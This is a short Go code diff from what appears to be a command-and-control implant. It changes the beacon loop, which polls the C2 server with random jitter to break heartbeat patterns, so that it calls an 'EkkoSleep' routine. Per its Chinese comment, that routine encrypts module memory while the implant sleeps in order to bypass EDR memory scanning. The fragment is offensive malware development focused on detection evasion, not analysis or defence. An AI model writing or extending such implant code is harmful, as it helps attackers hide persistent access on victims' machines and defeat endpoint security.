@@ -98,10 +98,11 @@ func main() {
 	}
 
 	// 主循环: 随机间隔轮询C2
+	// P1: Ekko Sleep Encryption — 休眠期加密模块内存，绕过EDR内存扫描
 	for {
 		// 随机额外延迟，打破固定心跳模式
 		extraDelay := time.Duration(rand.Intn(3000)) * time.Millisecond
-		time.Sleep(tp.GetInterval() + extraDelay)
+		evasion.EkkoSleep(tp.GetInterval() + extraDelay)
 
 		pkt, err := tp.Poll(sessionID)
 		if err != nil {
